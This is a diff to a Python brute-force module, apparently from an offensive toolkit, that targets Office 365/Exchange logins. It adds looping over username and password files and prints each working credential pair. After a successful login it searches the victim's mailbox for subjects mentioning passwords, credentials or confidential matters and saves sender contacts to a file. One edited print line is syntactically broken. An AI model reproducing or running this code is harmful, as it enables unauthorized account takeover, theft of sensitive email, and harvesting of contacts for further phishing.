@@ -12,11 +12,11 @@ import re
 class Office365Brute(webModule):
     def __init__(self, config, display, lock):
         super(Office365Brute, self).__init__(config, display, lock)
-        self.fingerprint="[o,O]utlook"
+        self.fingerprint="Outlook"
         self.response="Success"
     fingerprint = "outlook"
     term = ['credential', 'account', 'password', 'login', 'confidential']
-    def searchMessages(self, term, data, config):
+    def somethingCool(self, term, data, config):
         # Parse the result xml
         root = etree.fromstring(data)
         xpathStr = "/s:Envelope/s:Body/m:FindItemResponse/m:ResponseMessages/m:FindItemResponseMessage/m:RootFolder/t" \
@@ -38,20 +38,21 @@ class Office365Brute(webModule):
                     '{http://schemas.microsoft.com/exchange/services/2006/types}From/{'
                     'http://schemas.microsoft.com/exchange/services/2006/types}Mailbox/{'
                     'http://schemas.microsoft.com/exchange/services/2006/types}Name').text
-#                fromemail = element.find(
-#                    '{http://schemas.microsoft.com/exchange/services/2006/types}From/{'
-#                    'http://schemas.microsoft.com/exchange/services/2006/types}Mailbox/{'
-#                    'http://schemas.microsoft.com/exchange/services/2006/types}EmailAddress').text
+ # If running agains a Small Business Server, this will break...
+                fromemail = element.find(
+                    '{http://schemas.microsoft.com/exchange/services/2006/types}From/{'
+                    'http://schemas.microsoft.com/exchange/services/2006/types}Mailbox/{'
+                    'http://schemas.microsoft.com/exchange/services/2006/types}EmailAddress').text
                 itemid = element.find('{http://schemas.microsoft.com/exchange/services/2006/types}ItemId').attrib['Id']
                 changekey = element.find('{http://schemas.microsoft.com/exchange/services/2006/types}ItemId').attrib[
                     'ChangeKey']
-                contacts.append(fromname.encode('ascii', 'ignore')) #+ " (" + fromemail.encode('ascii', 'ignore') + ")")
+                contacts.append(fromname.encode('ascii', 'ignore') + " (" + fromemail.encode('ascii', 'ignore') + ")")
                 for search_term in term:
                     if re.search(search_term, subject, re.IGNORECASE):
                         print "[+] This could be interesting: "
                         print "[+]       * Subject : " + subject.encode('ascii', 'ignore')
-                        print "[+]       * From : " + fromname.encode('ascii', 'ignore') #+ " (" + fromemail.encode('ascii',
-                                                                                                         #'ignore') + ")"
+                        print "[+]       * From : " + fromname.encode('ascii', 'ignore' + " (" + fromemail.encode('ascii',
+                                                                                                         'ignore') + ")"
             except:
                 pass
         print("[+]  Any contacts found will be saved to tmp/contacts-" + config["USERNAME"] + "...")
@@ -119,12 +120,34 @@ class Office365Brute(webModule):
         (status, data) = self.buildConn(request, user, config["PASSWORD"], config["HOST"], url, context)
         if (int(status) == 200):
             print("[+]  User Credentials Successful: " + user + ":" + config["PASSWORD"])
-            self.searchMessages(self.term, data, config)
+            if not config["dry_run"]:
+                print("[!] Time to do something cool!")
+                self.somethingCool(self.term, data, config)
         else:
             print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
 
     def payload(self, config):
-        if config["UserFile"]:
+        if config["PASS_FILE"]:
+            pass_lines = [pass_line.rstrip('\n') for pass_line in open(config["PASS_FILE"])]
+            for pass_line in pass_lines:
+                if config["UserFile"]:
+                    lines = [line.rstrip('\n') for line in open(config["UserFile"])]
+                    for line in lines:
+                        config["USERNAME"] = line.strip('\n')
+                        config["PASSWORD"] = pass_line.strip('\n')
+                        payload = {
+                            'username': config["USERNAME"],
+                            'password': config["PASSWORD"]
+                            }
+                        self.connectTest(config, payload)
+                else:
+                    config["PASSWORD"] = pass_line.strip('\n')
+                    payload = {
+                        'username': config["USERNAME"],
+                        'password': config["PASSWORD"]
+                        }
+                    self.connectTest(config, payload)
+        elif config["UserFile"]:
             lines = [line.rstrip('\n') for line in open(config["UserFile"])]
             for line in lines:
                 config["USERNAME"] = line.strip('\n')
